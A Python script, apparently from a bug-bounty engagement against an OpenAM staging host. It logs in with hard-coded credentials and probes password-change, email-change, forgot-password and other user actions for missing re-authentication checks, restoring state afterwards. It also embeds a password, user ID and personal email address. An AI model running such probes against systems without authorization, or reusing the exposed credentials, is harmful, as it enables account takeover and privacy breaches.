# -*- coding: utf-8 -*-
"""AIC 第二十八轮:changePassword 正确字段名 + mail 修改正确格式 + collection 级 forgotPassword
1. changePassword:{userpassword + currentPassword}(全小写 userpassword)
2. mail 修改:字符串格式 + userpassword(OpenAM protected attribute 规范)
3. POST /users?_action=forgotPassword(collection 级)
4. 恢复 givenName
"""
import requests, urllib3, json
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
AUTH = BASE + '/am/json/realms/alpha/authenticate'
USER, PASS = 'pccp', 'Agent360User$5h2!QxR'
MY_ID = 'db3d6356-61a0-4684-9eaa-c1353dfa44d9'
ORIG_MAIL = '1643584176@qq.com'

S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
S.headers.update({'User-Agent': 'Mozilla/5.0', 'Accept-API-Version': 'resource=1.0, protocol=1.0',
                  'Content-Type': 'application/json'})
r = S.post(AUTH, json={}, timeout=15, verify=False)
d = r.json()
authId = d['authId']
cbs = []
for cb in d.get('callbacks', []):
    t = cb['type']
    inp = [{'name': 'IDToken1', 'value': USER}] if t == 'NameCallback' else \
          [{'name': 'IDToken2', 'value': PASS}] if t == 'PasswordCallback' else \
          [{'name': k.get('name'), 'value': k.get('value')} for k in cb.get('input', [])]
    cbs.append({'type': t, 'output': cb.get('output', []), 'input': inp, '_id': cb.get('_id')})
S.post(AUTH, json={'authId': authId, 'callbacks': cbs}, timeout=15, verify=False)
tok = S.cookies.get('aa942d46ece12ce')
print('LOGIN OK')

S2 = requests.Session()
S2.trust_env = False
S2.proxies = {'http': None, 'https': None}
S2.headers.update({'User-Agent': 'research-1643', 'Cookie': 'aa942d46ece12ce=' + tok,
                   'Content-Type': 'application/json', 'Accept-API-Version': 'resource=2.1, protocol=1.0'})

U = '/am/json/realms/root/realms/alpha/users/' + MY_ID

def probe(method, path, body=None, label=''):
    kw = {'timeout': 12, 'verify': False}
    if body is not None:
        kw['json'] = body
    try:
        r = S2.request(method, BASE + path, **kw)
        tag = ('  <= ' + label) if label else ''
        print('%-5s %-62s -> %d  %s%s' % (method, path[:62], r.status_code, r.text[:240].replace('\n', ' '), tag))
        return r
    except Exception as e:
        print('%-5s %-62s -> ERR %s' % (method, path[:62], str(e)[:60]))

def login_as(u, p):
    S3 = requests.Session()
    S3.trust_env = False
    S3.proxies = {'http': None, 'https': None}
    S3.headers.update({'User-Agent': 'x', 'Accept-API-Version': 'resource=1.0, protocol=1.0',
                       'Content-Type': 'application/json'})
    try:
        r = S3.post(AUTH, json={}, timeout=12, verify=False)
        d = r.json()
        cbs = []
        for cb in d.get('callbacks', []):
            t = cb['type']
            inp = [{'name': 'IDToken1', 'value': u}] if t == 'NameCallback' else \
                  [{'name': 'IDToken2', 'value': p}] if t == 'PasswordCallback' else \
                  [{'name': k.get('name'), 'value': k.get('value')} for k in cb.get('input', [])]
            cbs.append({'type': t, 'output': cb.get('output', []), 'input': inp, '_id': cb.get('_id')})
        r2 = S3.post(AUTH, json={'authId': d['authId'], 'callbacks': cbs}, timeout=12, verify=False)
        return r2.status_code, bool(r2.json().get('tokenId'))
    except Exception:
        return 0, False

print('=== 1. changePassword(全小写 userpassword) ===')
probe('POST', U + '?_action=changePassword', {'userpassword': 'Temp1643$!', 'currentPassword': PASS}, '正确当前密码')
print('  新密码登录:', login_as(USER, 'Temp1643$!'))
probe('POST', U + '?_action=changePassword', {'userpassword': 'Temp1643$!', 'currentPassword': 'WRONG'}, '错误当前密码')
print('  错误当前密码后 temp 登录:', login_as(USER, 'Temp1643$!'))
probe('POST', U + '?_action=changePassword', {'userpassword': 'Temp1643$!'}, '无当前密码')
print('  无当前密码后 temp 登录:', login_as(USER, 'Temp1643$!'))
# 恢复(如果 temp 密码生效)
if login_as(USER, 'Temp1643$!')[1]:
    probe('POST', U + '?_action=changePassword', {'userpassword': PASS, 'currentPassword': 'Temp1643$!'}, '恢复原密码')
    print('  恢复后原密码登录:', login_as(USER, PASS))
else:
    print('  (密码未被修改,无需恢复)')

print('\n=== 2. mail 修改(字符串格式 + userpassword) ===')
for body, lab in [
    ({'mail': 't1643@test.com', 'userpassword': PASS}, 'mail字符串+userpassword'),
    ({'mail': ['t1643@test.com'], 'userpassword': PASS}, 'mail数组+userpassword'),
    ({'mail': 't1643@test.com', 'confirmationPassword': PASS}, 'mail字符串+confirmationPassword'),
    ({'mail': 't1643@test.com'}, '仅 mail 字符串'),
]:
    r = probe('PUT', U, body, lab)
    r2 = S2.get(BASE + U, timeout=12, verify=False)
    cur_mail = r2.json().get('mail') if r2.status_code == 200 else '?'
    print('  当前 mail:', cur_mail)
    if cur_mail in (['t1643@test.com'], 't1643@test.com'):
        print('  [发现] mail 修改生效!恢复...')
        probe('PUT', U, {'mail': ORIG_MAIL, 'userpassword': PASS}, '恢复 mail')
        break

print('\n=== 3. collection 级 forgotPassword ===')
probe('POST', U.split('/' + MY_ID)[0] + '?_action=forgotPassword', {'mail': ORIG_MAIL}, 'collection+mail')
probe('POST', U.split('/' + MY_ID)[0] + '?_action=forgotPassword', {'username': USER}, 'collection+username')
probe('POST', U.split('/' + MY_ID)[0] + '?_action=forgotPassword', {}, 'collection 空')

print('\n=== 4. 其他 action 枚举 ===')
for act in ['changePassword', 'forgotPassword', 'resetPassword', 'updatePassword', 'selfService',
            'validatePassword', 'getSessionInfo', 'idFromSession', 'logout', 'create', 'search']:
    probe('POST', U + '?_action=' + act, {'mail': ORIG_MAIL}, act)

print('\n=== 5. 恢复 givenName + 最终确认 ===')
probe('PUT', U, {'givenName': 'base'}, '恢复 givenName')
r = S2.get(BASE + U, timeout=12, verify=False)
print('最终资料:', r.text[:250].replace('\n', ' '))
print('原密码登录:', login_as(USER, PASS))
